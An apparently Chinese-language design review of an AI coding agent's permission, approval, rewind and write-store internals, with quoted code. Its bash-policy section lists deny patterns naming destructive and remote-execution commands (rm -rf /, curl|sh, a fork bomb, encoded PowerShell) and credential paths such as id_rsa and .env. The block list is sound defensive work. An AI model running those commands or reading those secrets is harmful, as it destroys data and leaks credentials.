Bash 是唯一"内容不可静态解析"的工具，所以策略只能是**模式匹配 + 否定式收紧**：黑名单拦已知破坏，白名单放已知安全，中间地带一律 ASK。

###### 18 条黑名单正则（`permissions/bash_policy.py:20-106`）

> **校勘（本次合并核实）**：实测 `_DENY_RULES` 为 **19 条 `re.compile` / 10 类标签**，块区间 **L20–L105**（非 `:20-106`）。报告中「18 条」为估算值。结论不受影响（该论点核心是「模式匹配不构成隔离」，与条数无关）。详见导言 §0.3-A。

按原因分类（每类都是"能一次干掉机器/数据"的动作）：

| 原因 | 覆盖 | 代表模式 |
|---|---|---|
| `destructive_root_delete` | 5 条 | `rm -rf /`、`del /s`、`rd /s`、`Remove-Item -Recurse`、UNC 破坏 |
| `disk_format` | 2 条 | `format X:`、`mkfs*` |
| `disk_wipe` | 2 条 | `cipher /w`、`dd of=/` |
| `system_power` | 1 条 | `shutdown`/`reboot`/`poweroff` |
| `registry_system` | 1 条 | `reg delete hklm` |
| `remote_exec` | 4 条 | `curl\|sh`、`wget\|sh`、`iwr\|iex`、`iex`、`bash -c $(curl)` |
| `fork_bomb` | 1 条 | `:(){ :\|:& };:` |
| `encoded_powershell` | 1 条 | `powershell -EncodedCommand` |
| `certutil_decode` | 1 条 | `certutil -decode` |
| `unc_destructive` | 1 条 | `rm \\\\host\share` |

`_normalize_command`（`:561-565`）先压空白与统一换行——*"降低简单空格绕过"*。

###### 密钥路径拦截（`:543-558`）

`_SECRET_TOKEN_RX` 覆盖 `.env*` / `.gitconfig` / `id_rsa|id_ed25519|id_ecdsa` / `credentials*` / `.npmrc|.pypirc` / `*.pem|key|p12|pfx` / `.ssh/*`。命中即 DENY（`bash_secret_read_reason`，`:599-609`）。

###### 只读白名单：正向放行（`:631-648`）

```python
def bash_readonly_allow(command, *, cwd=None) -> bool:
    if not isinstance(command, str): return False
    text = _normalize_command(command)
    if not text or _COMPOSITE_RX.search(text): return False   # 复合/管道 → 不放行
    if re.search(r"(?:>>?|2>>?|&>>)", text): return False     # 重定向写出 → 非只读
    if bash_secret_read_reason(text): return False            # 密钥 → 不放行
    return bash_rule_decision(text, cwd=cwd) == "allow"       # 前缀规则驱动
```

放行面由**前缀规则引擎**驱动（默认规则 = 原 `_READONLY_BASES` 迁移），工作区 `.xeyo/bash_rules.json|toml` 可追加（`:634-637`）。

###### 复合命令的否定式拒绝（`:612-628`）

`_COMPOSITE_RX = re.compile(r"[|;&`\n\r]|\$\(|&&|\|\|")` —— 命中即 `True`。用途不只是"不放行只读"，更是**禁止吃 grant**：

> G29：组合命令（`&&`/`;`/`|`/换行/`$(`/反引号等）不得用「前缀 token」的 always-allow grant 静默放行——`git status && curl x|sh` 不能蹭 `git status` 的授权。

这条机制的设计很值得记：**授权单元是"命令前缀"，但放行判断看整条命令是否复合**——两个粒度分离，堵住了"用安全前缀裹挟危险尾巴"。

###### 远程会话更严（`:651-654`）

`is_remote_session` 识别 `ilink:` / `filehelper:` 前缀（微信 / 文件助手）。远程会话强制 `pol.remote_bash ∈ {ask, deny}`，**不允许 default/allow 自动放行**（`:882-884`）——注释：*"远程工人无法弹窗确认 → 一律 DENY"*。

###### 对照提示

dsh 的 shell 是 capability seam（A-6/A-8），安全边界交给**沙箱**而非命令文本分析；XEYO 没有沙箱，只能把安全边界放在**文本分析**上。所以 XEYO 的 bash 策略比 dsh 复杂一个量级，但**它的安全性依赖"正则足够全"这个假设，而 dsh 的安全性依赖内核强制**——这是两种完全不同等级的可信度。

---

##### B-5 授权指纹：身份与参数分离

###### 设计意图

"don't ask again"要能复用授权，又要不能过度复用。XEYO 的答案：**指纹只哈希身份，参数永不参与**（`permissions/store.py:419-424`）：

```
§15.1② args 规范化纯函数：键序排序、紧凑分隔、ASCII 转义。

身份与参数分离（§15.1①）：v2 指纹**不含** args —— 本函数服务于
repeat_guard / 网关 describe 校验 / 审计去重等「参数规范化」消费方。
```

注意 `canonical_args` 存在，但**不参与指纹**——这是一个刻意的分工：`canonical_args` 服务 repeat_guard 与审计去重，指纹服务授权身份。

###### MCP 指纹 v2（`:440-456`）

```python
_MCP_FP_VERSION = "v2"

def mcp_grant_fingerprint(registered_tool_name: str) -> str:
    tool = (registered_tool_name or "").strip()
    if not tool.startswith("mcp__") or len(tool) <= len("mcp__"):
        return ""                                    # 身份不可用 → 空串，fail-safe
    canon = json.dumps(["mcp-tool", tool], ensure_ascii=True, separators=(",", ":"))
    digest = hashlib.sha256(canon.encode("utf-8")).hexdigest()[:32]
    return f"{_MCP_FP_VERSION}:{digest}"
```

逐字说明：输入是 `["mcp-tool", 注册名]` 的紧凑 JSON，SHA-256 后取前 32 hex，前缀 `v2:` 参与比对。**v1 旧授权结构上不可能命中**（`:440-441`）。

docstring 记了 v1 的过放缺陷与修复（`:471-475`）：

> 修复 v1 过放：v1 对所有 MCP 工具共用 `mcp_outbound_ask`，放行一个即放行全部 —— v2 按注册名隔离。

还有一个安全细节：**注册名必须来自网关的已知工具集解析**（`resolve_tool`），绝不从 args 读取（`:447-448`：*"身份经已知工具集校验，绝不从 args 读取，注入免疫"*）。

###### Bash 指纹（`:483-496`）

```python
if name == "bash":
    toks = raw.split()
    if not toks: return ""
    if len(toks) == 1: return toks[0].lower()
    return f"{toks[0].lower()} {toks[1].lower()}"    # program + 首参数
```

对应 UI 文案 *"don't ask again for commands starting with …"*。但这条指纹有个已知的粒度问题，由 B-3 的复合命令守卫补齐——**指纹可以是前缀，授予必须是整条命令**。

###### 其他工具（`:497`）

回落 `matched_rule`（同类原因聚合）。拒绝类规则在 policy 层先于 grant 生效，所以"同类聚合"不会把 DENY 洗成 ALLOW。

###### 对照提示

dsh 侧未见等价的 grant 指纹机制（第四轮已复核其审批结果只有 `allowed-once` 等封闭四值，**唯一授予值就是"这一次"**）。**这是两端审批哲学最硬的一处分歧**：dsh 只给"这一次"，XEYO 给"这一类，且带版本隔离"。XEYO 的复杂度（v2 指纹、身份/参数分离、五条守卫）是为"授权可复用"付出的代价。

---

##### B-6 审批挂起：风险分级 TTL + 幂等 resolve

###### 设计意图

`engine/permission_coordinator.py:1-10` 的 docstring 说清了职责缝合：

> 把 `SessionTaskState` 与 `PendingPermissionStore` 缝合起来：
> - request：创建 pending 请求、状态转 `waiting_permission`、发布 `PermissionPendingEvent`
> - wait：等待确认（超时按拒绝处理），状态回 `running`、发布 `PermissionResolvedEvent`
> - resolve：外部（前端/微信）确认或拒绝（审计由 `store.resolve` 统一写）
> 三选 peer ASK：wait 返回 `allow / deny / remind / timeout`

###### 挂起项结构（`permissions/store.py:33-58`，18 字段）

| 字段 | 类型 | 语义 |
|---|---|---|
| `request_id` / `session_id` / `turn_id` | str | 三级定位 |
| `tool_name` / `tool_input` | str / dict | 待执行动作 |
| `reason` / `prompt` | str | 判定原因 / 展示文案 |
| `expires_at` / `created_at` | float \| None | TTL 两端（`None` = 不超时） |
| `matched_rule` | str | 命中的规则名 |
| `command_summary` | str | Bash 摘要 |
| `choices` | tuple | 三选时非空 |
| `peer_summary` | str | 多会话冲突说明 |
| `resolved` / `approved` / `user_choice` | bool / bool\|None / str | 裁决态（`allow/deny/remind`） |
| `actor` | str | 谁裁决的 |
| `outcome` | str | `user_decided` / `timeout` / `aborted`（供 wait 侧区分结束原因） |
| `workspace` | str | 创建时工作区根（grant 落 workspace 维度） |
| `mcp_target` | str | 网关解析出的目标注册名（v2 指纹用） |

###### 风险分级 TTL（`permissions/pending_ttl.py`）

| 场景 | TTL | 依据 |
|---|---|---|
| AskUserQuestion（交互式提问） | **不超时**（`None`） | 由用户显式关闭结束 |
| 普通权限确认 | `PENDING_PANEL_TTL_SECONDS = 180.0` | `:26` |
| 危险操作（reason/matched_rule 命中 `danger`/`secret`/`protected`） | `PENDING_DANGER_TTL_SECONDS = 60.0` | `:27,32` |
| 到期前提醒 | `PENDING_REMINDER_BEFORE_S = 30.0` | `:28` |

**危险操作给更短的 TTL**——这条反直觉但正确：危险操作不应该在屏幕上停三分钟等人误点。

###### 生命周期算法

```
request (:56-114)
 ├─ store.create → 风险分级 TTL → PendingPermission + asyncio.Event
 ├─ task_state.set_status("waiting_permission", interruptible=False)
 ├─ audit_log.record("permission.pending", ...)
 └─ emit PermissionPendingEvent（含 intent_for(choices) → choice|confirm）

wait (:137-...)
 ├─ 起 _remind_before_expiry 协程（到期前 30s 推 PermissionExpiringEvent）
 ├─ await asyncio.wait_for(ev.wait(), timeout=expires_at-now)
 └─ 返回 allow / deny / remind / timeout

resolve (:136-183)
 ├─ 幂等：item.resolved 已 True → return False
 ├─ choice 合法则按 choice；否则按 approved 推导
 ├─ ev.set()（唤醒 wait）
 └─ audit_log.record("permission.resolved", approved/user_choice/actor/outcome)
```

###### abort 时的唤醒（`:185-206`）

注释点出一个不显眼的坑：

> abort 不会唤醒挂在 `wait` 上的 `asyncio.Event`——回合等待审批时点停止，租约要等面板 TTL（180s）到期才释放。interrupt 路径调用本方法让等待者即刻返回。

所以 `cancel_pending_for_session` 把该会话所有未决请求按"已取消（拒绝）"处理并 `ev.set()`，`outcome="aborted"`。

###### 面向模型的三态文案（`pending_ttl.py:29-42`）

| 常量 | 触发 |
|---|---|
| `REJECTED_COPY` | 用户显式拒绝 |
| `CANCELLED_COPY` | 面板关闭 / Esc / 停止（`outcome=aborted`） |
| `UNAVAILABLE_COPY` | 超时或协调器缺失 |

注意 `REJECTED_COPY` 的措辞：*"Permission denied: the user explicitly rejected this action. Do not retry the same call; adjust the approach or ask the user."* —— 这是**结果型**表述（拒绝是事实 + 不重试是可执行约束），不是劝导。

###### 审计配对

`pending_ttl.py:18-19` 明写：*"审计配对：`permission.pending` ↔ `permission.resolved`（allow/deny 都记），即计划中的 `approval.asked/decided` 对——命名以 `permission.*` 为准，不再双写。"*

###### 对照提示

dsh 的审批（A-6）是**封闭四值 + 唯一授予值 `allowed-once` + 无 answerer 即 `unavailable`（fail-closed）**，且把审批策略写成**动态 context 而不写事件**以保缓存前缀。XEYO 是**三态（含 remind）+ 可复用 grant + 风险分级 TTL + 审计配对**。dsh 的设计目标是"结构上不可能过度授权"，XEYO 的设计目标是"确认频率可调且授权可复用"——**前者的失败模式是"太啰嗦"，后者的失败模式是"太宽松"，两端各自把失败模式选在了自己更能承受的一侧。**

---

##### B-7 rewind v2：内容寻址 + 事件日志 + 括号事务

###### 设计意图

`rewind/models.py:1-8` 的模块 docstring 是这套设计的纲领：

```
Durable data contracts for enterprise rewind.

These models deliberately contain metadata and content-addressed references,
not raw file bodies.  File bodies belong to a snapshot store introduced by the
operation-integration phase.  Keeping the contracts as dataclasses makes them
compatible with XEYO's existing JSONL persistence style without coupling the
backend to Pydantic or the GUI.
```

三个决策写在第一段：**契约里只有元数据与内容寻址引用**（文件体不进 JSONL）、**用 dataclass 不用 Pydantic**（不耦合后端与 GUI）、**沿用 JSONL 风格**。

###### 八个数据契约（`models.py:74-221`）

| 契约 | 关键字段 | 语义 |
|---|---|---|
| `SessionRevision` | `parent_revision_id` / `turn_ids` / `message_ids` / `transcript_hash` | 不可变的时间点视图（**有 parent → 天然成树**） |
| `TurnRecord` | `status` / `operation_ids` / `stop_reason` | 一次用户提交引发的全部工作 |
| `OperationRecord` | `before_hash` / `after_hash` / `inverse_kind` / `inverse_payload` | 一次可逆变更（`inverse_payload` 只含引用与参数） |
| `SnapshotManifest` | `content_hash` / `size_bytes` / `line_endings` / `storage_path` | 内容寻址快照的元数据 |
| `RollbackPlan` | `plan_hash` / `conflicts` / `requires_confirmation` | dry-run 结果，绑定源 revision 与不可变 plan hash |
| `ApprovalRecord` | `plan_id` + `plan_hash` + `decision` | **对某一个确切 plan hash** 的显式批准 |
| `RecoveryJob` | `idempotency_key` / `applied_operation_ids` / `status` | 可幂等寻址的执行态 |
| `AuditEvent` | `event_type` / `actor` / `revision_id` / `turn_id` | 追加式审计 |

契约注释里两处拒止值得记：`OperationRecord` 的 *"It must never be populated with complete file contents"*（`:117-119`），`SnapshotStore` 的 *"A snapshot manifest is returned even when the content already exists, so journal entries can retain stable references without copying file contents into JSONL"*（`snapshot.py:18-20`）。

###### 快照存储：原子 + 幂等 + 校验读（`rewind/snapshot.py`）

`put_bytes`（`:39-79`）算法：

```
1. 未启用 → None（不产生半态）
2. content_hash = sha256(data).hexdigest()
3. target = root / content_hash；已存在 → 直接返回 manifest（幂等，不重写）
4. 否则：mkstemp 同目录 → write + flush + fsync → os.replace → 异常时 unlink 临时文件
```

`get_bytes`（`:99-109`）**读时重算哈希并比对**：*"snapshot hash mismatch: expected X, got Y"* —— 磁盘损坏不会被静默吞掉。

###### 操作日志：追加式状态机 + latest-wins 折叠（`rewind/journal.py`）

两张转移表（`:28-39`）是硬约束，非法转移直接抛：

```python
_OPERATION_TRANSITIONS = {
    "started":   frozenset({"completed", "failed", "cancelled"}),
    "completed": frozenset(), "failed": frozenset(), "cancelled": frozenset(),
}
_TURN_TRANSITIONS = {
    "running":   frozenset({"committed", "failed", "aborted"}),
    "committed": frozenset(), "failed": frozenset(), "aborted": frozenset(),
}
```

`:203-204`：`raise ValueError(f"invalid operation transition {current.status!r} -> {status!r}")` —— **终态不可复活**。

追加实现（`:70-81`）：一行 JSON + `flush`，**fsync 默认关**，理由写在 `:64-65`：

> 每次 append 后 fsync；默认关闭（flush 已保证进程内顺序完整，读端本就容忍 partial line）。审计要求落盘即持久时设 `XEYO_REWIND_FSYNC=1`。

读侧容忍坏行（`:101-110`）：*"进程被杀可能留下最后一行残页：解析失败的行直接跳过即可，无需（也不应该）为每个坏行重新打开文件数总行数。"*

读缓存按 `(path, mtime_ns, size)` 键（`:123`），上限 64 条后整体清空（`:130-131`）——缓存键含 mtime+size，所以**写后必失效**，不会读到旧态。

###### revision 树：truncate 不删旧记录（`rewind/revision.py:175-209`）

```python
def truncate_to(self, target_revision_id, *, metadata=None) -> SessionRevision:
    """Create a new head containing exactly the selected target revision.
    Existing records are never deleted.  The new revision is a branch from
    the target and carries a reason in metadata, which makes a later
    rollback auditable and permits recovery if execution fails."""
```

这是"回溯"与"删除"的分界线：**回溯 = 从目标点再开一个分支**，旧 revision 永久留在树里。与 dsh 的 fork（A-11）在**语义上相通**（都是"从某点分叉"），但 XEYO 分叉的是 **revision**，dsh 分叉的是 **session**。

###### 检查点：消息发出瞬间的 blob 图（`rewind/index.py`）

`FileCheckpoint`（`:191-198`）是 `path → content_hash` 的 COW 图；id 由 `_hash_entries`（`:215-220`）生成：

```python
digest.update(f"{session_id}|{user_message_id}".encode())
for path in sorted(entries):
    digest.update(f"{path}:{entries[path]}".encode())
return f"cp3_{digest.hexdigest()[:32]}"
```

`cp3_` 前缀 + 排序保证**同 (session, message, 图) 幂等**——`freeze_checkpoint`（`:223-262`）先查再写。

路径归一化有一处防坑注释（`:206-208`）：

> 不能用 `lstrip("./")`：那是按字符集剥离，会把根目录点文件 `.gitignore`/`.env` 改写成 `gitignore`/`env`，restore/undo 落到错误路径。

###### 三把锁（`rewind/locks.py`）

| 类 | 语义 | 关键 |
|---|---|---|
| `ResourceLease` | 进程内短期租约，TTL 默认 300s | `validate()` 检查 released + 过期 + lease_id 仍是当前（`:56-64`）——**三重校验** |
| `ProcessWorkspaceLock` | 工作区作用域租约 | `:135-138` 命名去混淆注释：跨进程锁是 `engine.workspace_lock.WorkspaceLock`，**两者不可混用** |
| `SessionLock` | 会话作用域租约 | 与 chat busy lease 独立 |

`release()` 的防御（`:73-78`）值得记：`self._state.lock.release()` 包 try/except RuntimeError，注释 *"防御性：获取失败或进程关闭时，清理绝不能变成第二次失败"*。

###### Turn 上下文：contextvars 传播（`rewind/context.py`）

`RewindExecutionContext`（`:21-95`）用 `contextvars` 传播到并发工具任务（注释 `:25-27`：*"can be propagated to concurrently executed tool tasks through contextvars. Operation IDs are collected in call-completion order; the journal itself remains the source of truth."*）。

`record_file_mutation`（`:41-95`）的核心是"**先写快照再写日志，任一失败即抛**"：

```python
before_manifest = self.snapshots.put_text(old_content, ...) if existed_before else None
after_manifest  = self.snapshots.put_text(new_content, ...)
if after_manifest is None or (existed_before and before_manifest is None):
    raise RuntimeError("rewind snapshot persistence failed")
record = self.journal.start_operation(..., inverse_kind="restore_snapshot" if existed_before else "delete_file", ...)
if record is None:
    raise RuntimeError("rewind operation journal is disabled")
completed = self.journal.transition_operation(record.operation_id, "completed")
if completed is None:
    raise RuntimeError("rewind operation transition was not persisted")
```

`inverse_kind` 只有两个值：`restore_snapshot`（文件本来存在 → 恢复旧内容）/ `delete_file`（文件本不存在 → 删除）。**"删除"是一个明确的逆操作，不是一个默认行为**。

###### 回滚服务四段（`rewind/service.py`，1800 行）

| 阶段 | 入口 | 关键约束 |
|---|---|---|
| `preview` | `:768-983` | dry-run；`plan_hash` 由 payload 计算（`:743-747`）；不落任何变更 |
| `_check_file_preconditions` | `:649-700` | **simulated 状态机**逐 op 模拟；`after_hash` 必须等于磁盘现状，否则 conflict |
| `execute` | `:1363-1694` | 要求 `plan_id` + `plan_hash` + `idempotency_key` + `confirmed` 四件套（`:1377-1400`） |
| `resolve_recovery` | `:1695-1760` | `retry_checkpoint` / `abandon` 二选一；abandon 走 `WorkspaceRestoreTransaction.reconcile()` |

`_check_file_preconditions` 的逐 op 校验链（`:656-697`）：

```
1. 路径缺失 → conflict
2. _safe_path 越界 → RollbackBlockedError → conflict
3. symlink → conflict（明确不支持）
4. state.exists != (after_hash is not None) 或哈希不符 → conflict
5. inverse_kind 不在 {restore_snapshot, delete_file} → conflict（不可逆）
6. restore_snapshot 但无 before_hash → conflict（旧快照丢失）
7. delete_file 但 after_exists 为假 → conflict
8. status != "completed" → conflict
9. 通过 → simulated[path] = 反向状态（供下一个 op 校验链式效果）
```

**第 9 步是这套校验的精髓**：同一批 ops 里前面 op 的效果会反映到后面的前置校验里，所以"预览通过"和"执行成功"是同一个状态机推导出来的。

###### 对照提示

dsh 没有"回滚工作区文件"这套东西——它的可逆性建立在**会话日志**上（回溯 = 换一个 surface 投影），而不是**工作区内容寻址**上。这是两端最本质的能力错位：**dsh 能撤销"对话"，XEYO 能撤销"对磁盘做的事"。** 对编码 Agent 来说后者更贵也更难，XEYO 在这块投入了 12 个文件 5343 行。

---

##### B-8 rewind v3 热路径：崩溃顺序合同 + orphan 先落盘

###### 设计意图

`rewind/hotpath.py:1-13` 整段是设计自陈：

```
回溯 v3 热路径事务：``POST /rewind`` 的 orphan → 原子重写 → 异步恢复。

崩溃顺序合同：**orphan → fsync → 原子替换 transcript → 再改工作区**。

- ``continue``：整轮（target user 消息及其回复/工具轨迹）写入
  ``orphans/{rewind_id}.jsonl``，随后原子重写 transcript 前缀；工作区恢复
  在后台线程执行，恢复前逐文件记录 ``pre_rewind_index`` 供 Undo。
- ``restore``：不改 transcript，仅后台恢复文件 + 审计。
- Undo：orphan 追加回 transcript + 按 ``pre_rewind_index`` 写回文件；
  有新消息落盘或路径被再次修改时拒绝/跳过（评审 #5）。

不依赖 shadow-git、不走 preview。v2 ``rewind.service`` 保持原样作降级路径。
```

**"崩溃顺序合同"是这套机制的灵魂**：写盘顺序被设计成"无论在哪一步崩溃，系统都停在一个可解释的状态"。orphan 先落盘 → 即使随后崩溃，那一轮对话已可找回。

###### 一个重要的实现演进（`:427-430`）

```
replace 事件化（46 号）：读合并日志（含轮转归档）→ surface fold →
在「模型可见面」中定位 target → 追加一条 rewind marker。
transcript 永不重写、不落 orphan；被回溯行留在原文件被影子化，
崩溃最坏结果是 marker 半行写坏被读侧跳过 = 回溯视为未发生。
```

**v3.1 已经不再重写 transcript 了**（尽管文件头注释仍描述旧合同）——改为追加一条 marker 行，由 surface fold 在读取时生效。崩溃最坏结果从"transcript 损坏"降级为"回溯未发生"。这是"崩溃合同"再收紧一档：**从"可恢复"进化到"崩溃即无事发生"**。

###### 状态机

```
continue:  transcript_committed ──┐
restore:   restoring ─────────────┴→ committed / partial / recovery_required / failed
```

`_spawn_restore`（`:530-560`）处理**没有 checkpoint 的情况**，注释（`:535-542`）写得非常具体：

> 无 checkpoint 也必须给终态：事件停在 `transcript_committed`/`restoring` 会让前端 `pollSettled` 只能等超时（然后误判「未确认」并回滚列表）。
> - continue：对话确实截断了，但**没有文件检查点**可恢复。不能置 committed（前端会当作「文件已恢复」而给误导文案）；置 `partial` + `no_checkpoint` 标记，让前端明确提示「仅截断对话，文件未回滚」。
> - restore：没有可恢复对象 → `failed`。

**"每个状态都必须是前端可渲染的终态"** —— 这是把 UI 语义当成状态机约束来设计的写法。

###### 崩溃恢复：启动扫描 + 对账（`:180-212`, `:215-302`）

```python
IN_FLIGHT_REWIND_STATUSES = frozenset({"transcript_committed", "restoring"})

def mark_crashed_rewinds(sessions_dir=None) -> int:
    """启动扫描：把「进行中但未达终态」的 rewind 事件标记为 recovery_required（§9.2）。
    进程崩溃会打断后台恢复线程，transcript 已提交、工作区可能处于中间态。
    重启后把这些 in-flight 事件提升为可处理状态（重试/放弃），避免被当作已完成。"""
```

外加 `_reconcile_orphan_surface_markers`（`:215-226`）处理一个更细的**半写坏**：

> transcript 里有 rewind marker、事件文件却没有对应事件。marker 追加成功但事件落盘前崩溃 → 该回溯在 fold 生效却无 pill/undo 入口。为其合成 `transcript_committed` 事件，让对话层有可撤销入口。

**这是"两个持久物之间的对账"**：marker 与 event 是两次独立写盘，中间崩溃会产生"生效但不可撤销"的状态，启动扫描把它补成一个合法终态。

###### 并发：按会话串行闸（`:45-50`, `:561-574`）

```python
#: 后台文件恢复 worker 的按会话串行闸：两个 restore 并发写同一工作区
#: 会产生混合终态、且后提交者的 pre_rewind_index 会拍到前者的中间态。
_RESTORE_LOCKS: dict[str, threading.Lock] = {}
```

`_restore_worker` 包 `_restore_lock_for(self.session_id)`，注释点出后果：*"undo 的哈希守卫还会把混合态判 `skipped_dirty`"*——即**串行不是为了性能正确，是为了语义正确**。

###### 终态判定（`:593-602`）

```python
skipped = report.get("skipped_dirty") or []
failures = report.get("failed") or []
if failures:      status = "recovery_required"   # 部分文件未恢复 → 工作区中间态
elif skipped:     status = "partial"             # 仅用户手改路径被跳过（预期行为）
else:             status = "committed"
```

**"用户手改过"被归为正常终态（partial），"恢复失败"才是异常（recovery_required）** —— 引擎尊重并发的人工修改，不把它当故障。

###### 一个数据丢失防线（`:613-620`）

`_journal_before_hash` 的注释记录了一个已修的真实 BUG：

> 删除分支的防御（BUG-1 数据丢失）：一个检查点冻结前**从未被索引、但本轮被 agent 首次修改**的既有用户文件，不在 `checkpoint.entries`、却在 `index.entries`，会落入删除分支被 `unlink`。这类文件在 mutation 时 `existed_before=True`，journal 里 `before_hash` 非空（`inverse_kind='restore_snapshot'`）。凡是存在此类记录，就应**恢复 before 内容**而非删除。

这是"两个索引不一致时，优先相信更保守的那个"的实例——防的是一个真实的删用户文件事故。

###### 对照提示

dsh 侧没有工作区回溯，但它的 A-2 崩溃恢复（`interruptedTurnClosers`）与 B-8 是**同构问题**：都要求"崩溃后的尾巴能被补成合法结构"。差别在修复对象——dsh 补的是**会话日志的对话结构**，XEYO 补的是**工作区文件 + transcript 的双向一致**。

---

##### B-9 rewind 存储回收：可达性 + 预算驱动 + dry-run 永不触盘

###### 设计意图

内容寻址库只增不减，必须回收。但回收的风险是删掉仍被引用的 blob（回溯就废了）。XEYO 的答案：**先算可达集，再只在超预算时删不可达项**。

###### 可达性计算（`rewind/blob_gc.py:305-370`）

```python
def collect_reachable_blobs(sessions_root=None, *, keep_recent=None) -> set[str]:
    """跨会话把「仍被任何 rewind 记录引用的 blob 哈希」收集成集合。

    - ``keep_recent`` 为空 → 最保守：任何 rewind 记录引用的都算可达。
    - ``keep_recent`` 给定 → 按「最近 N turn + 基线 + 锚点 turn」划分保留集：
      - operations 只计保留 turn 内（否则按 turn 老化）；
      - checkpoints 只计保留 user 消息（否则按 checkpoint-id 保留）；
      - ``agent_file_index`` / ``rewind_events`` / ``orphans`` 仍**全量**保留（安全兜底）。
    """
```

**安全兜底的设计值得记**：`agent_file_index` / `rewind_events` / `orphans` 三类**永远全量保留**，无论 `keep_recent` 多小。因为这三类是"撤销/恢复的安全底座"（`:326` 注释）。

###### GC 算法（`:410-488`）

```
1. 读开关：enabled（XEYO_BLOB_GC_ENABLED，默认 False）
           dry_run（XEYO_BLOB_GC_DRY_RUN，默认 True）
           max_bytes / keep_recent（配置文件 > 环境变量）
2. 枚举快照目录（只认 64 位 sha256 文件名，忽略临时文件）
3. reachable = collect_reachable_blobs(...)
4. deletable = blobs - reachable，按 (mtime, hash) 排序（最旧优先）
5. if not enabled:        return result          # 只报告
6. if 未超预算:            return result          # 保守，有不可达也不清
7. if dry_run:            return result          # 绝不触盘
8. 按 mtime 最旧优先删除，直到 freed_bytes >= need_to_free
```

`:471-472` 注释记录了一个真实事故：

> dry_run=True：deletable/over_budget 已在 result 中（报告面），不计 deleted、**绝不触盘（曾经漏判 dr 导致真删——`test_dry_run_and_disabled_never_delete` 钉死）**。

**三重默认安全**：`enabled=False` + `dry_run=True` + "未超预算不动手"。要真删必须同时满足三个条件——这是"删除类机制"应有的默认姿态。

###### 对照提示

dsh 侧没有等价的 blob 生命周期管理（它的 spill 文件是会话作用域且无跨会话回收需求）。这条机制是**内容寻址存储的必然配套**，XEYO 这里做得比多数实现保守（默认三重关）。

---

##### B-10 影子 git 与工作区指纹：只读元数据，不读内容

###### 设计意图

要判断"工作区在 preview 与 execute 之间有没有被改动"，需要一个指纹。XEYO 的选择是**只用元数据**（`engine/workspace_revision.py:11-20`）：

```python
class WorkspaceRevision:
    """Calculate a conservative, metadata-only workspace fingerprint.

    When ``paths`` is provided, only those relative paths are fingerprinted
    (plus shadow HEAD).  That keeps Vite/test churn outside the rollback plan
    from invalidating ``expected_workspace_revision``.

    Without ``paths``, git status identifies changed paths and we add ``lstat``
    metadata rather than reading file contents.
    """
```

**"不读文件内容"是刻意的**：大工作区全量读内容成本不可接受，而 lstat 元数据足以检测"变了没有"。

###### 指纹 token（`:47-74`）

```python
return (
    f"{status}\0{relative.as_posix()}\0{kind}\0{stat.st_size}"
    f"\0{stat.st_mtime_ns}\0{stat.st_ctime_ns}\0{stat.st_mode}"
)
```

七段：git status / 相对路径 / 类型（file|directory|symlink:target）/ size / mtime_ns / ctime_ns / st_mode。`\0` 分隔防拼接歧义。`kind` 对 symlink 记 `symlink:<target>`——**符号链接目标变化也算变化**。

`calculate`（`:76-109`）的语义分档：

- `paths=()`（空可迭代）→ **只指纹 shadow HEAD**——*"suitable for chat-only rollback where unrelated worktree noise must not block"*
- `paths=None` → 保留旧的 full porcelain 指纹
- `paths=[...]` → 只指纹指定路径 + HEAD

返回 `rev_<sha256[:16]>`（`:109`）。

###### 影子 git（`engine/shadow_git.py`）

独立 `GIT_DIR=.xy-shadow-git` + `GIT_WORK_TREE=<workspace>`（`:82-84`），**不污染用户的 `.git`**。`init_if_needed`（`:94-116`）配置 `core.autocrlf=false` + `core.ignorecase=true`，并把 `.xy-shadow-git/`、`.xy-trash/` 写进 `info/exclude`，同时更新用户主 git 的 exclude（`:118-120`）。

一处很实在的工程细节（`:12-26`）：

```python
def decode_git_bytes(data: bytes) -> str:
    """Decode git stdout/stderr without locking to a single codec.
    Modern git often emits UTF-8 paths, but Windows locales (GBK/cp936) and
    older tooling may emit other encodings. Try strict candidates in order;
    fall back to UTF-8 with surrogateescape so restore never sees empty trees."""
```

`_git_text_encodings`（`:29-51`）构造候选序列：utf-8 → locale 首选编码 → gb18030 → gbk → cp936 → mbcs → cp1252 → latin-1，最后兜底 surrogateescape。**"绝不空树"**是这条兜底的验收标准——编码问题不能导致备份内容丢失。

###### 对照提示

dsh 没有"影子 git + 工作区指纹"这套东西（它的版本化完全在会话日志侧）。XEYO 这里是**双轨版本化**：会话侧 `rewind`（内容寻址）+ 工作区侧 `shadow_git`（git 对象），两条轨服务于不同的恢复场景。

---

##### B-11 写入通道：每文件单写者 + 内容哈希版本校验 + 未读拒绝

###### 设计意图

`engine/write_store.py:1-9` 的模块 docstring 是完整设计陈述：

```
每文件单写者写路径（write-through store）。

设计（多 Agent 协同落地 #29 §2.1）：
- **每文件一把锁**：同文件串行 apply，不同文件可并行（submit 走 to_thread）。
- **content-hash 版本校验**：base vs 磁盘哈希，不一致 -> stale，不覆盖。
- **原子写**：temp + os.replace。
- **P0 单文件事务**；多文件走 _apply_multi 预检。
- **语法校验**：Python/JSON 增量（新文件引入错误才记 syntax_valid=false）。
```

###### 分片锁：一个内存有界的修正（`:170-180`）

```python
def __init__(self, root, *, shards: int = 64) -> None:
    self._shards = max(1, shards)
    # 分片锁：路径哈希映射到固定数量的锁。曾按"每文件一把锁"实现，
    # 锁表只增不减（长会话内存无界）；分片同样保证同文件串行。
    self._shard_locks = [threading.Lock() for _ in range(self._shards)]

def _lock_for(self, path: str) -> threading.Lock:
    return self._shard_locks[hash(path) % self._shards]
```

**"曾经每文件一把锁"是一个真实的内存泄漏**，改为 64 分片——同文件仍然串行（同路径必同分片），锁表有界。

###### 写路径的三道门

| 门 | 位置 | 行为 |
|---|---|---|
| 路径越界 | `_canon`（`:198-216`） | `relative_to(self._root)` 失败 → `PermissionError` |
| 写作用域 | `_canon` 内调 `write_scope_deny_reason` | 子 Agent 沙箱二次硬门禁 |
| 版本校验 | `_apply_core`（`:236-285`） | base ≠ current → `stale`；有文件但 base 空 → `missing_read` |

`missing_read` 的措辞正是 AGENTS.md 里点名的中性结果型（`:284`）：

```
"missing_read: no prior Read for this path in this session"
```

**"未读拒绝"这条机制的设计意图很清楚**：防的不是"模型看不到内容"，而是"模型基于过期理解盲写覆盖"。所以拒绝理由要给出可核实的事实（本会话没有该路径的 Read 记录），而不是警告。

###### 原子写（`:399-422`）

```python
tmp = path.with_name(path.name + ".xeyo.write.tmp")
write_encoding = encoding or "utf-8"
if write_encoding == "utf-16-le":
